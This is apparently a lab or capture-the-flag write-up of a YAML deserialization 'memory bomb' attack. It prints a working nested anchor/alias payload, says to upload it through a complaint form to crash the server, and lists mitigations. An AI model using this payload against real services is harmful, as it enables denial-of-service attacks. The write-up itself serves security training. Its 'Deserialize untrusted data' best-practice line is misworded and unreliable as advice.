# **Unsafe 5-memory deserialization bomb**

## 1. Methodology

**Step 1 – Create a malicious YAML file**

- Create a .yml file with a special structure that uses YAML anchors and aliases. These elements allow you to create a "memory bomb" by causing very rapid data expansion.

**Step 2 – File Contents**

- Use this structure to build a string where each level repeats the previous one many times:

```
a: &a [_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e,*e]

g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f,*f]

h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g,*g]

i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h,*h]

j: &j [*i,*i,*i,*i,*i,*i,*i,*i,*i,*i]

k: &k [*j,*j,*j,*j,*j,*j,*j,*j,*j,*j]

l: &l [*k,*k,*k,*k,*k,*k,*k,*k,*k,*k]
```
- This structure acts like a bomb because each level copies the previous one multiple times, causing the data to grow significantly when the program reads the YAML file.

**Step 3 – Upload via the Complaint System**

- Submit the malicious .yml file via the complaint system to activate the vulnerability.

**Step 4 – Validation**

- The challenge is successful when the memory bomb is triggered, using excessive memory and causing the system to crash.

## Techniques Used:

- YAML Deserialization Attack
- Denial of Service (DoS)

## Tools Used:

- Text editor for creating the YAML file

---

## 2. Vulnerabilities

**Vulnerability:**

- YAML Deserialization Vulnerability
- Denial of Service

**Affected Component:**

- YAML file upload system via complaint

**Severity:**

- **High**

---

## 3. Risks

- Excessive memory usage, which can cause a denial of service or system crash.

- Commercial Impact: loss of user trust, damage to reputation.

---

## 4. Actions

**Risk Mitigation**

- Disable alias processing in uploaded YAML files.

**Correction**

- Use secure YAML reading libraries, or limit file size and structure complexity.

**Best Practices**

- OWASP: Deserialize untrusted data.

---

## 5. Evidence

**Memory Bomb YAML Structure**
![Memory Bomb](./image/memory_bomb1.png)
![Memory Bomb](./image/memory_bomb2.png)